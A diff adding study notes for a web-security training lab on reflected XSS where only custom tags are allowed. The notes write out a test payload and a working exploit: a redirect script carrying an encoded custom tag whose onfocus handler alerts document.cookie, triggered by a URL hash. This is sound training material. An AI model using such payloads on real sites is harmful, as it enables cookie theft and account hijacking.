@@ -1,0 +1,16 @@
+Lab3: Reflected XSS into HTML context with all tags blocked except custom ones
+
+Goal: Perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
+
+1. Test to see if the the application is vulnerable to XSS
+    You can first submit the payload <img src=1 onerror=print()> to the search bar. This returns an error stating that 'tags' are not allowed.
+
+2. Create custom tag to inject payload
+    <script>
+        location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+    </script>
+    decoded: ?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+
+    This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 
+    
+    An 'onfocus' event handler is triggered when a user clicks into the search bar - which then will trigger a JS function which we are telling to create an alert. 
